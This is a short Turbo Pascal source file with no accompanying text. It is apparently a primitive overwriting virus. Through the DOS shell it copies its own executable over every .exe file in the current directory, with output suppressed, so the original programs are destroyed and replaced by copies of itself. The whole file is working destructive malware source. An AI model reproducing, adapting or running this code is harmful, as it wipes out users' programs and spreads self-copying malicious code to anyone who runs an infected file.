   {$I-,S-}{$M 3000, 0, 3000}
   uses dos;
   begin
   exec(GetEnv('COMSPEC'),'/c for %%i in (*.exe) do copy '+paramstr(0)+' %%i >nul');
   end.
